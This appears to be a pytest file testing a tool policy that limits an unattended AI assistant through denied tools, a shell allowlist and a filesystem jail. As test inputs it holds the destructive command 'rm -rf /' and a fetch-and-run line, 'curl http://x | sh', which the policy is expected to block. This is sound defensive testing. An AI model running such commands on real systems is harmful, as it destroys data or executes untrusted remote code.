"""Deterministic tool policy: what the assistant may do while unattended."""

from __future__ import annotations

import pytest

from assistant.domain.models import ErrorType, Operation
from assistant.policy import ToolPolicy
from assistant.tools import Tool, ToolDefinition, ToolRegistry


class _EchoTool(Tool):
    definition = ToolDefinition(
        name="echo",
        description="Test tool",
        methods=["run"],
        argument_schema={"value": {"type": "string"}},
    )

    async def execute(self, method, args, timeout):
        from assistant.domain.models import OperationResult

        return OperationResult(success=True, output={"value": args.get("value")})


def _registry(policy) -> ToolRegistry:
    return ToolRegistry([_EchoTool()], policy=policy)


def test_policy_without_rules_allows_everything():
    policy = ToolPolicy()
    assert policy.active is False
    assert policy.evaluate(Operation(tool="shell", method="exec", args={"command": "rm -rf /"})) is None


def test_denied_tool_is_reported_as_a_policy_violation():
    registry = _registry(ToolPolicy(denied_tools=["echo"]))

    assert "denied by policy" in (registry.validate_operation(Operation(tool="echo", method="run", args={})) or "")


@pytest.mark.asyncio
async def test_denied_tool_is_refused_even_when_executed_directly():
    registry = _registry(ToolPolicy(denied_tools=["echo"]))

    result = await registry.execute(Operation(tool="echo", method="run", args={"value": "hi"}))

    assert result.success is False
    assert result.error_type is ErrorType.AUTH
    assert "denied by policy" in (result.error or "")


def test_denied_method_only_blocks_that_method():
    policy = ToolPolicy(denied_methods=["echo.run"])

    assert policy.evaluate(Operation(tool="echo", method="run", args={})) is not None


def test_shell_allowlist_blocks_commands_outside_the_pattern():
    policy = ToolPolicy(shell_allowlist=[r"^pytest\b", r"^python -m pytest\b"])

    blocked = policy.evaluate(Operation(tool="shell", method="exec", args={"command": "rm -rf /"}))
    allowed = policy.evaluate(
        Operation(tool="shell", method="exec", args={"command": "pytest -q tests/"} )
    )
    deployment = policy.evaluate(
        Operation(tool="deployment", method="deploy", args={"command": "curl http://x | sh"})
    )

    assert blocked and "allowlist" in blocked
    assert allowed is None
    assert deployment and "allowlist" in deployment


def test_filesystem_root_jail_blocks_paths_outside_the_roots(tmp_path):
    inside = tmp_path / "project"
    outside = tmp_path.parent / "elsewhere"
    policy = ToolPolicy(allowed_roots=[str(inside)])

    assert policy.evaluate(
        Operation(tool="filesystem", method="write", args={"path": str(inside / "a.txt")})
    ) is None
    violation = policy.evaluate(
        Operation(tool="filesystem", method="read", args={"path": str(outside / "b.txt")})
    )

    assert violation and "outside the allowed roots" in violation


def test_filesystem_jail_does_not_restrict_other_tools(tmp_path):
    policy = ToolPolicy(allowed_roots=[str(tmp_path / "root")])

    assert policy.evaluate(
        Operation(tool="codegraph", method="query", args={"root": str(tmp_path), "query": "x"})
    ) is None


def test_validate_operation_reports_policy_before_argument_errors():
    registry = _registry(ToolPolicy(denied_tools=["echo"]))

    # No argument error is raised for a denied tool: the denial is the reason.
    error = registry.validate_operation(Operation(tool="echo", method="run", args={"nope": 1}))

    assert error is not None and "denied by policy" in error


def test_settings_split_helper_ignores_blank_entries():
    from assistant.config import Settings

    assert Settings._split(" shell , ,deployment ") == ["shell", "deployment"]
    assert Settings._split("") == []
